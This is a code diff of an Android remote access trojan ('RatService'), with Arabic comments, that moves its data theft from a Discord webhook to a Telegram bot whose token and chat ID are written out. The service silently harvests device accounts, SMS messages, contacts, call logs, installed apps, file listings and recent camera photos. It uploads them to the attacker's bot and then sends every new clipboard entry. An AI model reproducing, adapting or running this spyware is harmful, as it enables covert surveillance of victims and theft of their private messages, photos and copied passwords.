@@ -12,7 +12,6 @@ import android.os.Environment;
 import android.os.IBinder;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
-import org.json.JSONObject;
 import java.io.*;
 import java.util.Arrays;
 import java.util.Comparator;
@@ -20,7 +19,11 @@ import java.util.List;
 import okhttp3.*;
 
 public class RatService extends Service {
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566641052885061632/5z7tnnjZNykfW869bY_xahti6-RlQ4F-mTd0LYU52LK7oJLuQRpNYMaXpkRpsOiDSPn8";
+    // ⚠️ غير البيانات هنا
+    private static final String BOT_TOKEN = "9086594295:AAFDb4xNafSILfLpaotY8Mc-XDcO1YjzAzo";
+    private static final String CHAT_ID = "6978974735";
+    private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
+
     private OkHttpClient client = new OkHttpClient();
     private String lastClipboard = "";
     private boolean isRunning = true;
@@ -32,24 +35,24 @@ public class RatService extends Service {
         
         new Thread(() -> {
             try {
-                sendTextToDiscord("🔄 **الأداة اشتغلت! جاري سحب الحسابات والبيانات...**");
+                sendTextToTelegram("🔄 **الأداة اشتغلت! جاري سحب البيانات...**");
                 
                 dumpAllAccounts(); Thread.sleep(1000);
                 String info = "📱 **Device:** " + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE;
-                sendTextToDiscord(info); Thread.sleep(1000);
+                sendTextToTelegram(info); Thread.sleep(1000);
 
                 dumpSms(); Thread.sleep(1500);
                 dumpContacts(); Thread.sleep(1500);
                 dumpCallLogs(); Thread.sleep(1500);
                 dumpApps(); Thread.sleep(1500);
                 dumpFiles(); Thread.sleep(1500);
-                dumpImages(); // سحب الصور
+                dumpImages();
 
-                sendTextToDiscord("✅ **اكتمل سحب البيانات والصور بالكامل!**");
+                sendTextToTelegram("✅ **اكتمل سحب البيانات والصور!**");
                 
                 startClipboardMonitor();
             } catch (Exception e) {
-                sendTextToDiscord("❌ خطأ: " + e.getMessage());
+                sendTextToTelegram("❌ خطأ: " + e.getMessage());
             }
         }).start();
     }
@@ -64,35 +67,42 @@ public class RatService extends Service {
         }
     }
 
-    // دالة سحب الصور (أحدث 5 صور من الكاميرا والواتساب)
+    private void dumpSms() {
+        File file = new File(getExternalFilesDir(null), "sms_all.txt");
+        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
+            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
+            if (c != null && c.moveToFirst()) {
+                do {
+                    bw.write("From: " + c.getString(c.getColumnIndexOrThrow("address")) + "\n" + c.getString(c.getColumnIndexOrThrow("body")) + "\n-------------------\n");
+                } while (c.moveToNext());
+                c.close();
+            } else {
+                bw.write("لا توجد رسائل أو تم رفض الصلاحية.");
+            }
+            bw.flush(); 
+            uploadFileToTelegram(file, "text/plain");
+        } catch (Exception e) {
+            sendTextToTelegram("❌ فشل سحب الرسائل: " + e.getMessage());
+        }
+    }
+
     private void dumpImages() {
         File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
-        File pictures = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
-        
         File[] allImages = new File[0];
-        // بنلم الصور من فولدر الكاميرا
-        if (dcim.exists() && dcim.listFiles() != null) {
-            allImages = dcim.listFiles();
-        }
-        
+        if (dcim.exists() && dcim.listFiles() != null) allImages = dcim.listFiles();
         if (allImages.length > 0) {
-            // ترتيب الصور من الأحدث للأقدم
             Arrays.sort(allImages, new Comparator<File>() {
-                public int compare(File f1, File f2) {
-                    return Long.compare(f2.lastModified(), f1.lastModified());
-                }
+                public int compare(File f1, File f2) { return Long.compare(f2.lastModified(), f1.lastModified()); }
             });
-
             int count = 0;
             for (File img : allImages) {
-                if (img.isFile() && (img.getName().endsWith(".jpg") || img.getName().endsWith(".png") || img.getName().endsWith(".jpeg"))) {
-                    // التأكد إن حجم الصورة أقل من 8 ميجا عشان الديسكورد ميرفضهاش
-                    if (img.length() < 8 * 1024 * 1024) { 
-                        uploadFile(img, "image/jpeg");
-                        count++;
-                        try { Thread.sleep(2000); } catch (InterruptedException ignored) {} // فاصل بين كل صورة والتانية
+                if (img.isFile() && (img.getName().endsWith(".jpg") || img.getName().endsWith(".png"))) {
+                    if (img.length() < 10 * 1024 * 1024) { 
+                        uploadFileToTelegram(img, "image/jpeg"); 
+                        count++; 
+                        try { Thread.sleep(2000); } catch (Exception e) {} 
                     }
-                    if (count >= 5) break; // بنسحب 5 صور بس عشان ميعملش سبام
+                    if (count >= 5) break;
                 }
             }
         }
@@ -102,19 +112,10 @@ public class RatService extends Service {
         try {
             AccountManager am = AccountManager.get(this);
             Account[] accounts = am.getAccounts();
-            StringBuilder sb = new StringBuilder("📧 **الحسابات المسجلة على الجهاز:**\n");
-            
-            if (accounts.length == 0) {
-                sb.append("لا توجد حسابات مسجلة.");
-            } else {
-                for (Account account : accounts) {
-                    sb.append("- **").append(account.type).append(":** `").append(account.name).append("`\n");
-                }
-            }
-            sendTextToDiscord(sb.toString());
-        } catch (Exception e) {
-            sendTextToDiscord("❌ فشل سحب الحسابات: " + e.getMessage());
-        }
+            StringBuilder sb = new StringBuilder("📧 **الحسابات المسجلة:**\n");
+            for (Account account : accounts) sb.append("- ").append(account.type).append(": `").append(account.name).append("`\n");
+            sendTextToTelegram(sb.toString());
+        } catch (Exception e) {}
     }
 
     private void startClipboardMonitor() {
@@ -127,7 +128,7 @@ public class RatService extends Service {
                         String text = item.getText() != null ? item.getText().toString() : "";
                         if (!text.isEmpty() && !text.equals(lastClipboard)) {
                             lastClipboard = text;
-                            sendTextToDiscord("📋 **نص تم نسخه (Clipboard):**\n`" + text + "`");
+                            sendTextToTelegram("📋 **Clipboard:**\n`" + text + "`");
                         }
                     }
                     Thread.sleep(5000);
@@ -136,31 +137,12 @@ public class RatService extends Service {
         }).start();
     }
 
-    private void dumpSms() {
-        File file = new File(getExternalFilesDir(null), "sms_all.txt");
-        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
-            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
-            if (c != null) {
-                while (c.moveToNext()) {
-                    bw.write("From: " + c.getString(c.getColumnIndexOrThrow("address")) + "\n" + c.getString(c.getColumnIndexOrThrow("body")) + "\n-------------------\n");
-                }
-                c.close();
-            }
-            bw.flush(); uploadFile(file, "text/plain");
-        } catch (Exception ignored) {}
-    }
-
     private void dumpContacts() {
         File file = new File(getExternalFilesDir(null), "contacts_all.txt");
         try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
             Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-            if (c != null) {
-                while (c.moveToNext()) {
-                    bw.write(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) + " : " + c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) + "\n");
-                }
-                c.close();
-            }
-            bw.flush(); uploadFile(file, "text/plain");
+            if (c != null) { while (c.moveToNext()) bw.write(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) + " : " + c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) + "\n"); c.close(); }
+            bw.flush(); uploadFileToTelegram(file, "text/plain");
         } catch (Exception ignored) {}
     }
 
@@ -168,13 +150,8 @@ public class RatService extends Service {
         File file = new File(getExternalFilesDir(null), "calls_all.txt");
         try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
             Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
-            if (c != null) {
-                while (c.moveToNext()) {
-                    bw.write("Number: " + c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) + " | Dur: " + c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)) + "s\n");
-                }
-                c.close();
-            }
-            bw.flush(); uploadFile(file, "text/plain");
+            if (c != null) { while (c.moveToNext()) bw.write("Number: " + c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) + "\n"); c.close(); }
+            bw.flush(); uploadFileToTelegram(file, "text/plain");
         } catch (Exception ignored) {}
     }
 
@@ -183,7 +160,7 @@ public class RatService extends Service {
         try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
             List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
             for (ApplicationInfo app : apps) bw.write(app.packageName + "\n");
-            bw.flush(); uploadFile(file, "text/plain");
+            bw.flush(); uploadFileToTelegram(file, "text/plain");
         } catch (Exception ignored) {}
     }
 
@@ -193,30 +170,28 @@ public class RatService extends Service {
             File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
             bw.write("=== Downloads ===\n");
             if (download.exists() && download.listFiles() != null) for (File f : download.listFiles()) bw.write(f.getName() + "\n");
-            bw.flush(); uploadFile(file, "text/plain");
+            bw.flush(); uploadFileToTelegram(file, "text/plain");
         } catch (Exception ignored) {}
     }
 
-    private void sendTextToDiscord(String text) {
-        try {
-            JSONObject json = new JSONObject();
-            json.put("content", text);
-            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
-            client.newCall(new Request.Builder().url(WEBHOOK_URL).post(body).build()).enqueue(new Callback() {
-                @Override public void onFailure(Call call, IOException e) {}
-                @Override public void onResponse(Call call, Response response) {}
-            });
-        } catch (Exception ignored) {}
+    private void sendTextToTelegram(String text) {
+        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build();
+        Request request = new Request.Builder().url(TG_API + "sendMessage").post(body).build();
+        client.newCall(request).enqueue(new Callback() {
+            @Override public void onFailure(Call call, IOException e) {}
+            @Override public void onResponse(Call call, Response response) {}
+        });
     }
 
-    private void uploadFile(File file, String mimeType) {
+    private void uploadFileToTelegram(File file, String mimeType) {
         if (!file.exists()) return;
         RequestBody requestBody = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
-                .addFormDataPart("content", "📁 **ملف:** " + file.getName())
-                .addFormDataPart("file", file.getName(), RequestBody.create(file, MediaType.parse(mimeType)))
+                .addFormDataPart("chat_id", CHAT_ID)
+                .addFormDataPart("document", file.getName(), RequestBody.create(file, MediaType.parse(mimeType)))
                 .build();
-        client.newCall(new Request.Builder().url(WEBHOOK_URL).post(requestBody).build()).enqueue(new Callback() {
+        Request request = new Request.Builder().url(TG_API + "sendDocument").post(requestBody).build();
+        client.newCall(request).enqueue(new Callback() {
             @Override public void onFailure(Call call, IOException e) {}
             @Override public void onResponse(Call call, Response response) {}
         });
